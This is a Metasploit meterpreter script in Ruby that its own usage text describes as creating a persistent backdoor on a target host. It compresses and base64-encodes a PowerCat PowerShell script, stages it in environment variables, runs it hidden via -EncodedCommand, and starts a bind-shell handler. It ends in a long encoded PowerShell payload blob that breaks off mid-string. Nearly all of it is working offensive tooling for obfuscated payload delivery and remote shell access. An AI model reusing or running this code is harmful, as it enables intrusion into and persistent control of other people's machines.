##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##


# Author: Ben Turner
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ true,   "The IP of the system being exploited = rhost"]
)
meter_type = client.platform

################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
  def usage
    print_line "Meterpreter Script for creating a persistent backdoor on a target host."
    print_line(@exec_opts.usage)
    raise Rex::Script::Completed
  end

  # Function for setting multi handler for autocon
  #-------------------------------------------------------------------------------
  def set_handler(rhost,rport)
    print_status("Starting connection handler at port #{rport}")
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = @client.workspace
    mul.datastore['PAYLOAD']   = "generic/shell_bind_tcp"
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = rport

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/Handler started!")
  end

  def have_powershell?
    cmd_out = cmd_exec('cmd.exe /c "echo. | powershell get-host"')
    return true if cmd_out =~ /Name.*Version.*InstanceId/m
    return false
  end

  #
  # Insert substitutions into the powershell script
  #
  def make_subs(script, subs)
    subs.each do |set|
      script.gsub!(set[0],set[1])
    end
    if datastore['VERBOSE']
      print_good("Final Script: ")
      script.each_line {|l| print_status("\t#{l}")}
    end
  end

  #
  # Return an array of substitutions for use in make_subs
  #
  def process_subs(subs)
    return [] if subs.nil? or subs.empty?
    new_subs = []
    subs.split(';').each do |set|
      new_subs << set.split(',', 2)
    end
    return new_subs
  end

  #
  # Read in a powershell script stored in +script+
  #
  def read_script(script)
    script_in = ''
    begin
      # Open script file for reading
      fd = ::File.new(script, 'r')
      while (line = fd.gets)
        script_in << line
      end

      # Close open file
      fd.close()
    rescue Errno::ENAMETOOLONG, Errno::ENOENT
      # Treat script as a... script
      script_in = script
    end
    return script_in
  end

  #
  # Return a zlib compressed powershell script
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    # If eof is set, add a marker to signify end of script output
    if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(psh_expression)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    return encoded_expression
  end

  #
  # Execute a powershell script and return the results. The script is never written
  # to disk.
  #
  def execute_script(script, time_out = 15)
    running_pids, open_channels = [], []
    # Execute using -EncodedCommand
    session.response_timeout = time_out
    cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
      "#{script}", nil, {'Hidden' => true, 'Channelized' => true})

    # Add to list of running processes
    running_pids << cmd_out.pid

    # Add to list of open channels
    open_channels << cmd_out

    return [cmd_out, running_pids, open_channels]
  end

  #
  # Powershell scripts that are longer than 8000 bytes are split into 8000
  # 8000 byte chunks and stored as environment variables. A new powershell
  # script is built that will reassemble the chunks and execute the script.
  # Returns the reassembly script.
  #
  def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

    # Check to ensure script is encoded and compressed
    if compressed_script =~ /\s|\.|\;/
      compressed_script = compress_script(compressed_script)
    end
    # Divide the encoded script into 8000 byte chunks and iterate
    index = 0
    count = 8000
    while (index < compressed_script.size - 1)
      # Define random, but serialized variable name
      env_prefix = "%05d" % ((index + 8000)/8000)
      env_variable = env_prefix + env_suffix

      # Create chunk
      chunk = compressed_script[index, count]

      # Build the set commands
      set_env_variable =  "[Environment]::SetEnvironmentVariable("
      set_env_variable += "'#{env_variable}',"
      set_env_variable += "'#{chunk}', 'User')"

      # Compress and encode the set command
      encoded_stager = compress_script(set_env_variable)

      # Stage the payload
      print_good(" - Bytes remaining: #{compressed_script.size - index}")
      execute_script(encoded_stager)

      # Increment index
      index += count

    end

    # Build the script reassembler
    reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
    reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
    reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
    reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

    # Compress and encode the reassemble command
    encoded_script = compress_script(reassemble_command)

    return encoded_script
  end

  #
  # Log the results of the powershell script
  #
  def write_to_log(cmd_out, log_file, eof)
    # Open log file for writing
    fd = ::File.new(log_file, 'w+')

    # Read output until eof and write to log
    while (line = cmd_out.channel.read())
      if (line.sub!(/#{eof}/, ''))
        fd.write(line)
        vprint_good("\t#{line}")
        cmd_out.channel.close()
        break
      end
      fd.write(line)
      vprint_good("\t#{line}")
    end

    # Close log file
    fd.close()

    return
  end

  #
  # Clean up powershell script including process and chunks stored in environment variables
  #
  def clean_up(script_file = nil, eof = '', running_pids =[], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
    # Remove environment variables
    env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    env_del_command += "Select-String #{env_suffix}|%{"
    env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
    script = compress_script(env_del_command, eof)
    cmd_out, running_pids, open_channels = *execute_script(script)
    write_to_log(cmd_out, "/dev/null", eof)

    # Kill running processes
    running_pids.each() do |pid|
      session.sys.process.kill(pid)
    end


    # Close open channels
    open_channels.each() do |chan|
      chan.channel.close()
    end

    ::File.delete(script_file) if (script_file and delete)

    return
  end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-r"
    rhost = val
  end
}

# End of file marker
eof = Rex::Text.rand_text_alpha(8)
env_suffix = Rex::Text.rand_text_alpha(8)

# check/set vars
script_in = read_script("/root/Desktop/powercat.ps1")

# Get target's computer name
computer_name = session.sys.config.sysinfo['Computer']

# Compress
print_status('Compressing script contents.')
compressed_script = compress_script(script_in, eof)

# If the compressed size is > 8100 bytes, launch stager
if (compressed_script.size > 9998100)
  #print_error("Compressed size: #{compressed_script.size}")
  error_msg =  "Compressed size may cause command to exceed "
  error_msg += "cmd.exe's 8kB character limit."
  print_error(error_msg)
  print_status('Launching stager:')
  script = stage_to_env(compressed_script, env_suffix)
  print_good("Payload successfully staged.")
else
  print_good("Compressed size: #{compressed_script.size}")
  script = compressed_script
end

testscript = "JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHIAdABQAFcAdAAzADIAOABhAFYAMwAvAGsAcgBKAGwAagB1AEMAbQBoAEkAaABxAEoAcwBOADEAVQBqAHQANwBKAEUATwB6AG8AcgB5AHoAbwBpAG4AYgBSAEgAcQA3AFUAaABjAEUAaQBpAEIAZwBFAFUAQQBDADIAcgBMAFAALwA3ADMAagBzAFAAWQBBAFkAWQBrAEsAQQBrAE4AMgAwADMAVAB1AEsAUQB3AE0AeQBkACsAMwA3AE0AWABJAEQAVABaAGUAaABsAGYAaABTAFMATwBMAHEAagBpAGUAZABtAHIAVgBXAEwAawBOAGgATgAzAEkAVQBOAEgAdwBpADUAZABnAFAAZgBUAFcAMwByAEoAUABCAHAAbQBGAG4ATwB6AFgAVwBhAEoAWAA0ADQAdQAyAGwANwBSADUAYgBWADAAYwBhAGMAKwAyAGwARwBRAHoAYgBtAHoAcwArADgAKwBVADAANwBPAEcAcQAvAGQAbwBPAFUANgB1AE0AdQBvADQAUgBCAHUAcwBSAGwAYQBFAFkAVAArAHoASgBLAGYAVQBUAGoAcQBMAHUAdgByAEIAQgBYAFYAaABoACsAbwBkADQAeQBvAHkAbwBhAHQARwA3AFEASgBWAEsAVQB6AG0AawBRAHEAQgBqAFIAMgBJAGoAUwBGAFEAMwBjAGUAeABWAHMAVQBnAEgANwAvAHYAUgBTAEIAYgBRADAAdwBwAG0ARQBLAFQAQgB4AG8ARQBLAEMAUwB4AFYAWQBwAHgAZQBqADEANgA0AGYATABCAE0ANgBuAGkAYwAwAG4AVQBmAEIAQgBLAGYANABZAFgAWQB3AFkARABPAG0AMgBkAEYAKwBYADUAOAB6ADkAaABjADAAVwBtAGIASwB1AE8AegBvAGgAUgB4AFQAcwBQAEkAbgBOADEAagBTADEAMABtADAAdQBQAFIAagBHAHYAZwBoAFAAVwBxAFAAawB5AFcARgBXAFEATABPAFcAUgBnAHoASwBHADMALwBxAEIAMAB1AGcAMABCAEEAZwBIAG4AKwB4AE0AMwBvAGkARwBiADIAMwBvADkAUgBtAHUAMQAxAHkATgA2AHIAKwA0AHkAbQArAEcASABFAGkATgBrAHIAbwBMAHgAYgBaAGcAQgBtAGYAQgA5AHIAdwBvAGkATwBMAEoAeABhAG8AcABhAFAAZgBlADAASAArAHQAaABwAGwAUwAxACsANgBrAFYAaABTAEwAMQBNADUAZgBTAGsAUgBtAEkAeABCAFgAUQBUAGQAVwBSAFMASQA5ADAAMwBOAEsAUQBKAEQATAA1ADAANwA0AFAASQBuAGEAaABUAFoAaABzAG4ARABFAE0AdgBtAGwAQgA5AEEAagBYAE8AKwBKAEUARwBzAFQAcABzAEwAawBiAEIASQBBAGYAKwBnADMALwAvAFEALwA5AEQAZgBoAHkAZQBYADUAWQB2AHcAcgBBADIAUQBpAEoASAB4AEcAcABKAGsAeQBSAGQAYwBrAEUAegArAE4AQQBoADQAegBrAGwAaABWADYAVABuACsAQQBEAFcARQAzAHIAagBaAC8ATgBsADcAYwBFAFcASQBKADIARgBDAFgAMwBoADIAUwBlAFoAWABGADYAKwBOADEAMwBNADMAYQByADUAMABXAEwANwAyADUAcAA2AGkAKwBpAFoATwA2AEgAMABYAGUANQB1AGIAZgBHAGMAegA4AGwAcQBaAGYANABjAFUAYgBjAEwASwBPAEwATwBFAHQASgBGAGgARgAvAEUAUQBkADAAQQBUAFoAUABNAGwAaAAwAEMAcgB3AEcAYgBVADEASgBOAEMAVQBoAFEANABiADQASQBYAEcANQAyADIARABJAHQARABpAE0ASABqAGsARABPAEUARQBhAEUAWgBCAGsANQB2AHAAaABTAHUAaQBYAEwASABFAEwAQwBPAG4AUwBtAHgATQAzAEoAYgBkAEwAUAA4AGkANgBBAEMAVgBCADIAMABzADcATQBJADcAWgBiAGEAdQBBADIAUwBGAHUATwBJAEYAVgBoAEYAVQBSAGoAegBtAGgAWABxAHYAMQBQAG4AVgBuADkARABCADMAVwB1AFMANgA2ADUARQBvAEkAZAAzAGcAQgBqADcARwBjAEQAMwBKADQARgBNAFUAbwAwADkASgBiADEAcgBBAFYAaABoAEEAZgB2AEQAagBsADAAVAA4ADQAZgA2AE0AdgBBAFgAeAA5AHMAaABsAEUAbgAzADIASgA1AFIAUgBlAG4AYQBKAE4ATwBLAG4AOQBCADcAYwAyAFkATABjAFIAMAB0AHkANQA2AGQAegBaAEkAcgBRAFQAdgBqAFkAYQA1AEgASwBuADcATQBwAEcAKwB3AG0AbABDAHgAVAAwAEgASABTAEIAYwBRADcASgBJADIAcAA1ADAALwB2AEcAVQB3AHcAZgBEAEsAaQB5AFcAZQBhAEkATABpAFUAQQBuAGwALwBYAGQATABFAHAAMgBrAEYASgBpAEkAZAA2AEEAdAB3AEIAeQB1AFEASABtAFYAdQBBAHEAdwBtAEEAYgBzAEkAQQBNAEcATAA0AHgASgBJAHYARgBqAFQAcAB4AE4AeQBlADAAKwA2AGMAWQArAHIASQBMAEMARwAvAEkARAAzAEIAUgB2AFEARQBmAGUAWQBVAHIARgBKAEcAbwBFAGQAWgBHAGkAbQAzAE8ATAByAHcAQwBvAFMARwBFAFYAZwBTAGUAUQBKAFkATQBMAHQAQQBtAEkASwB2AFMARgA0AEoAYwBsAFAASABFAHQAVABwAGwAdwBwADQAcAA3AEQAaQBUAFUAaQBCAFIAeABGAHoAdwB0AGEANAA1AFEAdQBKADUARwBpAGQAYwBEAEMARgBFADIAZwBSAC8ANABNAG4AUABmAGMAMABDAEMAVwBDAGYAVQBDAGwATQBsAG4ATgAvAEgAZAAyAHcAQgBZAGoAVgBvAGwAdABBADAAbwBYAGkAegBnAE8AOABqAHAAZABnAGwASwB6AFUAVwBZAEoAZgBlAEkASgBtAGcASQBUAFEAdwBRADMAVABBAEMAZwBoAEwAQwBVAGIARABEAE4ASQBpAGkAVAA4AHUANABnADYAYQBSAHoAagB2AEUAVwAwAHgAQQBuAFQATwB2ADUAMwBCAEYAWQBzAFAAdQBmAFAAaAByADcAbwBhAHoAcQBwAGcAVAA0AEMAUwA0AFIAYQBtAGMATABCAGoAMQB5AFAAcwBVAHgARABjAEYASwBUAEEARABRAFgAMABDADgASABkAFIAOABnAG4AUQBjADYAZABUADMAeQBPADMAOABKADIAQwBUAE8AQQBxAEMAVQBFAHAAVQBwAE4AVwBDAGsAMQBuAFEATQBuAHIASwBGAG0ANAAyAFMARgBoAGkANgBMADAAcwBzAGkATABnAHAAZQBIAFkAQgByAEUAbgBVAHcAUwArAE0AVAAwAHcAdwBEAG4AWABPAHEAWgBEAHEAawBFAHAAMgA0ADIASwBQADQASgBtAG4AQQBKAEQAWgBnAE4ATgBuAEwANABBAC8AdwBGAG8AawBTADcAZQBNAG0ALwBNAEQAagB3AE0AVgBxAEEARAAzAGwAWgA0AGQAaABTAGgAdwA2AHgAVwBWAG8ARgBtAHAAVABrAFQANABSADIAQgB2AGQANgA1AEIAWAAxADMARwBWAEsAaQBaAC8AdABwAFgAaQBsAHcAdwBUAEQALwBZAGsAQgAyADgAVQB5AHoAYgBoADEAUQBrAGgAMABnAGMAOABnAEIAdQA0AGUATwBKAEsAbwBhAFMAQwBXAE4ASQA3AEMAUwBWAFcAYwBpAEQAKwBSAHEARABQAFMAYQA1AEYARABrAE4ASwA3ADQAVABRAFAAcgAyAGIARQBBAHoAMABKAGEAVwBBAFMAcAAyAHAAZABCAGQAZABRAFcANwB0AGUASgA3ADgAcQBqAGIAWQBiAGMAeAArAHEAKwBpAEMAVABpAFQAQgBjAGMAVQBLAEcANABZAEEANwB6AGcANgBqAEIAUAAwAEQAWABNAEsAcgBZAFgAQQBQAE4AaQBpAGQAYwBCAFgASwBHADUAcQBwAFAAQQBJAEwAbwBjAFoAQQA1AEwAdQB6ADYATQB2ADMATAA3ADQAVABoAEoAdgA0AE4AOAAzAEEAVwA0AGYAYwBUAHkASAAvAFIATABaAEUAOABuAFMAcABRAEcAcwBlADMAUgBHAHcANABIAHQAeQA2ADAANABnAGMALwBVACsAVQBRAHgAZwB1AFgAUgByAG4ARQBJAEMALwBLAEMAZgBxAFIAUQB0AC8AUQBMADUASgA1AGcAbQBpAEkAagB4ADcAVwA4ADAAaQBjAGoAZABuAEsASwBVAFAAZQBwAC8AUgB1AHUAYgBRAGcASwBUAEMAbgBiAEMAcQBMAGsALwBtAHgAcwBBAG8AOABFAHUARQBDAFQANAB1AEYAcwAvADgATABQADcAUQB0AEkAKwArAGgATQB3ADQAcQByAEsAWgBLAFMAZwBGAC8ANgBJAFgASQAvADcANQBuAEMANQB1AEUAWAAzAFAAbwBWAGwAdwBUADkAUABtAEEAZQA5AGMALwAxAE0ASQBqAC8AagArAEMAMQBqAEQAQQBIAGMAVABlAFAAMwB5AE8AUwA2AGgASQBOAG4AdABKADcAUwBxAGIAcwBNAHcAQQB4AGYAOQBDAHMASQArAFEAdwBoAFMATgBzADQAUwBpAHgAcABMAEEASQBsAHMAdwByAEEANABoAGEARgBEAFQAeQBlAFIASABjAGkAKwBFAEQAUwBpAGMARQA5AGoAUQBBAFYAKwBMACsAYgBMAHcAagBmAC8AZABTAEEARQBFAFUAKwBBAGQASgB6AE8AbABGAGMAMwBpAEkAcQBXAEoANwA3AGQAbwB3AGcAZQBaAHkATwAzAFkAeQBGAFoASgBjAE4ANgBwAGkAOABOAE0AUQArAGMAUABCAHUAawBvAEQASABpAFcANwAvAEEAbABpAHcAbwBPAFkAUwBuAG8ASQBXAGMARgBtACsAdwBsAEUASABQAFcATABoAEsAawBxAFoAdQBDAEkARABYAEoAbAAxAGQASQBEAFgAbgB5AGoAWgBjADkAbQBmAFAAZgBMADMASQBoACsAQgBiAEcATwAvADMAOQB2AEgAZgB6AEQAbwBmAGwALwBsAGIAdwBUADgAegBTAEIANwBGAGgATABuAEsAWABJAFIATwAxAEcAcABjADIAaQBnADgATQB0AGcAQQBwAG8ASQBDAFIAUgB3AE0AWgB3AHkANwA0AGsAYwBaAFEAYQBMAE0AUwB4AE0AbwA0AEMAYQBiAEoASwBsADkAYwBLAGcAVQA1AGEAYQBWAEoASgA2AHgAaABTAGUAOAB1AGMANgBnAFkAWQBsAEwAbABWAFIAbgA0AEwASABCACsANQByAHEAQgBOAE0ANwAzAHUANgBlADkASgBGAHgATABRADIAOABVAEUAaQBFAFoAOQBoAFMAbgBnAG0AcABhAGkAUgBGAHcAUwA5AGcAaAAwAHMAawBFADcAeQBPADgAUwBkAFoAcwBLACsATgBGADEAVABOAGMAcwBZAHcAeQBmAEMASgBoAEcAWABLAFIAUgBNAHEAUABTAFkAQwA2AE4AMwBLAHoAUQBSAFgARgBTAEkANQBtAFMASQAyAG4AcgBpAEkAZwB1AFMATQBxAGEAWQBCAC8AdgBoADAAZwAzAEEAZQB5AFkAMAA1AFoAawBNAFEAOQBsAG4AYgBDADQAbwBvAFIATwBUAEIAQQB0AE0AYQBKAFkASgBPADQAZABNAEMARgBOAC8AdABQAFIATQB1AEYAdgBUAFYATQBSAHkAVgB2AGIAUgB2AEwASQBoAG8AaABiAHEASQBlAEsAbwBWADIAaQByAHMAZwB4AEkAYwB4AHMAQgBIACsAaABEAHUAcwA0AEkAawBSAGsAVABjAEcAMgBEAFYAYwBCAFkAbABEAHAAdwBWAGkAbwBkAEoAbABSAHoARgAzAHgAdABuAHAAVAAyAGcATgBVAFkAWABiAGcAegBaAFkAeABrAEsAMABCAGEAWgBZAEIAOABpADAATAB5AG8AZwBSAGkAbQBsAHYARABJADAAWQBvAE4AUgBNAHEAYQByAGkAQwA0AE4ATwBJADgAZwBDAFIAWQBuAEkASwB4AEgAWgBuAFAAUABsAEwAQwBrAFkAbwB4AEoAdQBjAEsAUABpAE0AVwB5AG8AWgBNAHMARgBTAGkATQBYAE4ATwAvAGYAKwBVAEUAMQBPAHUAMABQAHkAQQB4AFgATABjADUAQQB2AFcAUwAwAHkAMQA4AEYAZAB3AHAAMgBNAFEANQBoAGoAOABiAGUAQQBuAEIAYgBxAEcANgBoAHoAaABsADkAYwBMAE0AUABTAFEANQB4ADIATABoAE4AdwBIAHQAMgAvADcALwBmADcAagBIACsAeABtAEsANABZAGwAcwBrAHIARgBNADQAcAA0AEQANgBwADMAKwBjAEoAKwBFAG0AZQA4AHgAZABPAGkANgAzAHcANwBOAGwAQgBoADIAZABCAEwAbABIAHEATQBSAHAAaQBGAGsAMQBBADUAMgA2AHgAMwBMAHkAdgBMAHEAQgA3AFAAdwBDAEQAeABRAEkAawB4AGEAVAA3AHUAYgBLAGsAbQBnAEcASgB4AEEARQBvADkAQQBZADkAeQBtAG4ASABqAEUARQBHAFgAYwB6AEgAUQBEADYAaQBZAGcASQA0AHgAWAB4AGwAcgBrADcARQA4ADQATgB0ACsARAAwAC8ANABDAG0AYgB2AGkAWgBIAGQATQBTAHAAbAAvADUATABUAG4AdABlAGkARwBBAFQAOQBPAGUAUwAwAGUAaABhAFQAZwA3AC8AaAAvAGsAYQBoAE0AVwBCAC8AOAB5ADgASQBTAE0AQQA0AHkAbQBMAHAASQBLAGkASQBQAEwAYwBRAEMAdgB0AGgARQBTAGUAUABjAE0AaABBAEMAdgBLAEkAUgBtAEUAeQA4AGEAaABvADkAWQBHAGIAdABDAGgAaABEAHUAdgBDAGYAZwBvAHcAVQBoAFgAcQA3AEoAWQBHAFYAYQB2AFMASwB5AEkAUQB6AHYAbQBxAC8AQQBrAFgAeQBhADYAdwBFAHcAMABKAHIAKwAwAEwATQArAEsAdgBCAGoAcABZAFYAZAAvAHgANgA0AHEAOABwAE0AagBOAGkANwBNAFIAaAB6AEsATwBZAGUALwA0ADIAbwB0AG4ATQBMAE8AaQBEAFQAUwBSAGcAQwBNAHUAbwBpAHcAaQB1AEsAOQBnAGQAcABwAFcARwBQAFoAawAyAFAAOQAvAE8AQwB3AHAASAAwAFcAegBQAGEAbgBkAG4AdgB1AHIARQBUAGMAWgB4AHQARAA2ACsAWQBiAFMAWQBhAFIAUAB4ADIAZgBuADUAMABlAGoANABmAGsAKwBPAHIATgB5AEwAVAAzAE4AQQB1AGkAVwB6AGMANAAvAEkAbQBaAE4AaQBWAEgAcABDADAAKwBDAG0AeABBAG8ANwBvAGgAcABCAEIANwB6AHEAbwBkAHcAVwAyAFIAUwA2AHoARgBiAGIAUwBpAEwAdgAwAHIAcwBTAHoAYwA4ADEAbwB4AEIAcwBCADEAMgAyADUANwA4AGoAcgBwAG8AcgByAFoAMwA3AFEARABCAHoANQBEAFYATwBNADMAQQBXAGgAKwBFADIAOQBKAG8AaQAxAE0AMABVAFEAMQBGAHEARABIAG8ARAA2AHIAdgBFAFYAdQB2AHcARABYAFMAdQB5AHUANQAyAEEASwBJAHoAWQBvAHgATABYAEEANgBWAGwAcgBpAFUARQA3AGwAdQB2AG4AZwBDADgARAA2AHEAWQAwAFQAeQBsAGQATABqAGEAUgBhADcAUABLAGkAYwA4AFgAdABDAEUAUgBpAFkANgBuADMAYQBiAHkAUQBrADQASwByAFEAeQBKAEgAWABHAFgARwBDAEgAZwBiAFkAMQBZAGoAQwAyAHMAMABvAHAAOQA3AHgATgA4AGsAdABzAG4ASwBkAFIAUwBYAGQAcABCAFMANABPAC8ARQBrAHYAaQAxAGYAWQBaAFQATABhAFYASwA4AEYAcQBDAHkARgBpAEMAcQBiAEYAYQBqAHoAZABnAFoAaABMADMARABnAE8AZgBJADkANQBkAFMAegBhAGUAaABJADQAUwBDAEsAWABZADEAdQBXAFkARQBjAGsAMwA5AGsAawBiAE0ATQBqAFEAOQAwAE8AWABjAGgALwBSADAAeABHAFgAWgA1AFgAawB2AE8AegAwAFgAaAA0AGMAWABiAHgAQgB1ADcAOABKADEAawB4AFoARAAvADAAeABoAEcALwBiAFQAdQA5AEYARgBiAE4AYgBPAHYAUQBjAHEANwAzAGIAKwBRADMAQQB0AC8ANgBOAHcANgBUAFYAegB0ADIAVgBzAHgASgBkAGsAVwBTAGEAVgB0AGoAVgBsADgARwBMAEYAdgBpAEkAcgBQAEkAdAB6AEEAUQAvAHIASwBRAEgARABkAEkAcQBEAHUANQBSAHkATwBIAGUAcgA4AEgARABQAGgAOQBqAGoAcgBmAEMAVgA4AFgAVwBpAEcAdQBPADYAdABiAG0AUABSAEoAawBYAGIAQgBQADEAVwBQADIANABtAEMAYwB1ADgAawBXAG8ASQBHAEkAcABvAEQAaAA0ADEAWQBDAFkATQAzAGMAKwBxAHIAOAB5AHIAUgB4AHoAVABsAFgARwBuAGEAegBuAHkAcwA0AHkAVABuADUAZgBvAEIAWABzAGcAdwBCAGYAZAAzAFgAcgArAC8ATwBCAG0AZgB2AGIAcwB3AFQAWgBuAEsAWQB5AHcAbwAzADUAZgB4AEIAeABpAGUAeQA0ADIAZgBaAGIAVgBmAHcAdwBoADIAOAB5AGMAMwBTAFoAMQBjAG8AcgByAEQAQQA2ACsAbQB1AEQANQBHAEoATgBkADkAcgA5AE0ATwBPAHUAMgA0ADAAOAA2AFkAVQBGAFYAWQB3AGoAagBnAEUAbgA2AEQAMgAzADkAYwByAGYAVgByADEAeABaAEwAUQBVAEcATwAxAGcAMwBjAHYANgBCADMAMwBYAGUAcwBHAGkAVQBqAHQAcwBQAGMARwA5AE0AdgBXAGUAOAA0ADkAWAB4AGYARABzAHoAeABDADAAcQBxAE4AWQBwAHcAZgArAE0AVQB5AGcAZwAvAFoAQwBYAGcAcQArAFYAMABDAGcANwBMAEIAQgBaADkAOAAvAFUATgBlAGYASAA4ACsAYwBFAEwATwBYADgAWQBUAGkANABqAFQAQgBkAE4ARQB5ADUAbwAxAGoAdQA3AHoASQBmAFkAMQA5AHIAMQA0ADgAawBFAHkAcABmADAANQB2AEQAdwBPAEwAeAAzAE8AbQBCAHoAdQBiADcAbgBoAEgATAAwAGEAcwBoAEUATQBIAHgAQQAyAGcATQBKAGkAWAAzAEoAQQBzAHcAbAAyADcAcwA1AGcALwBKADIANgAvAFMAegB5ADIASwB3AHEASQBVAEYARgBLADcAMABVAG8AcgB5AFQASgBKAHQAaAA0AFQAawB1AHQAOQBqAC8AOQB4AFUAUABNAGYAMQBjAGgATABmAFcASQA1AEUAUgBlAFMAbgBQADQASQAzAEQAYQBnAFUAdQBVADUAaQBqACsAUABmAGUAMABWAG4AZgBuAGoARgBOAG8AbgBvAFcANQA2ADQANAArAG0AYgBYAFMAZQBxAFQAcgAvAEQASgBOAEsANQBOAHQARABGAC8ALwA4ADYAYwBHAGYASQA1AHcAdgB3AC8AcAAzAHIAaABFADUAdgBjAHIAbAAxACsASgBFAGQAOQAvAGEANQBVAG0AUgBSAGYATwBkAG0AVQBLAGMAZABFAFEAbgAxADEASABkAG4ASQBkAFQAdgB2AGcAZABRADUAWAAyAEEAeQBYAGIAUwBnAGIAbQAyAG4AQQAwADEAVABrAEIAdABmAGsAWQBvAEwAcQAzAHkAawBnAGQAVgBFAEgAYwBCAGUAdQAvAFAAZQBsAGYAdQBIAGYAegA5ADMALwBUACsAKwBEAE0AWQBPAHcAWQBMAEoAeAArADMAVQBvAG8AawBtAFAATgBIAGUALwArADMAbgBjAEYAdgB3AFQASABsAGgAMABCAGwATwBGAGYAZwBYAFEAQwBXAGIAVgAxAEUAUQAyADgAZQBkAGMANQBDAEwAMQBoAE8ASwBGAHcANgBqAGUANQBDAGMASwA4AC8AKwBVAGsARwBSAFQATgBjAE8ASQBHAEEANwBqAGoASwBDAGkAdQB0AEoATgBNAGwAYgBwADIATQByADgANAB4AEcAeABpAE8AVABpAEMAVwBMAG0AZAB6ADMARgBVAEIAQgBzAFMAbwBBACsAaABIAG0ATwBYADIAZQBqADEATABnADIASwBXAE0ARQBDADAASABYADEAYwB6AGsAegBHADEAdABKAGQANQB2ADIAVQBLACsAdABXADkAUgBQAHkAdABBAEEAeQBEAE4AdwBZAEMAbgB4AHcAOQBaAGsAYgBqAE0AVAArAFgAbgBjAEcAZABwAEcAWgAyAGQAcwBNADAAVQAxAG8AbABoAGcAbQA5AGgAcQAvAHMAYwBEAEQANgAvAGoAcgBPAEcAcwAyADAAVAB0AEwAVAB5AEoATQBWAGkARwBZADEATwBEAEoAcwBXAE0ASgBJAGcAcAA3AHMAeABXAEIAZgBwAHQAcwBTAEYAdQBUAG0ANABMAGQAegBHADYAYwBzAHUASAB3AHIANABYAGIAcQBPAGUASQBiAFoAMABVACsAMABoAHMAWQArAGkAYQBlAFEAbwBKAHEAaQBjADgAWQBlAEUAVABaAFoAeABHAFYAMQBMAGoAVwA0AGoAcgBlAFQAVABHADAARwB1AG4AMABUAEwAeABxAEQASQBzAEIANAB6AG4AYwBUAGoARgBzAFIAegBkAG8AQwByAE0AUgBBADMAcABhADkARgBXADcASwBaAEMAdQBsAEcAKwBLAGoAKwB0AFcANQB0ADEAUQB4AEgAUABXAGUAaABuAHYAaABzAFUAZgBHAEEAcgBNADcAOQBlADUAOQBmAEEAdAAvAFoAcwA3AEUAeQA0AEsAUwBPAEwAUABSADIAdABBAGcARQBxAE0ANgBKAFYAawBUADkAOAAwAC8AWQBnAG4AKwBLAHUAdwByAFkAZwAyADYAaQA2AG8AdgBiAFoASgBmAHAAeQBEAEwAQwBLAE4AcQB2AEsAYwBCAHEAaQA4AE4ALwBRAEQARAAyAE4AawBBAHgATgBvAGIAeAB3AEkASwBuADYARwBSAE4AYgBHAFYARgBXAGsARgB1AEoAQQBhAC8AZABoAFEALwBKAE4AcQBzAE8AegBuAEIANwAvAG8ASwBmAHMAVgBsAHIAegBNAFIAVwBjAHQAVgB2AGcAZgBBAFAAVgBZAEUAWABUAEMANgByADAAQQBYAHUATABUAEgAcABlAGsAdwBKAFkARgBZAFUAZgBBAGIAeAA0ADMANABvAEIAOABKAHYAOAB3AFUAdwBqAFMAdABJAGYAWgBJAG8AZgBRAG0AUwBCAE0AZABlAHcARgBkAGoAdABrAFMAYwBGAHUAbgBwADYAdQB1AHMANwB4AG4AWABmAFYAVABPADAATgByAGcAQwBiAG4ARwAyAHAAaQB4AHgAVQA1AE4AVABqAEEAUwB4AFQAdABHAEEANwBrADMAQQBHAEoAUgBwAEYAVQB5AFkAWQB3AFcAZABjAEEAQQB5AEMARgA1ADYAMwA2AEMANQBCAHAAegBmAG4AbQBxAG4AMABZAEwAdQBhADAAVABsAFEAOABPAG8AZQBUAHkAd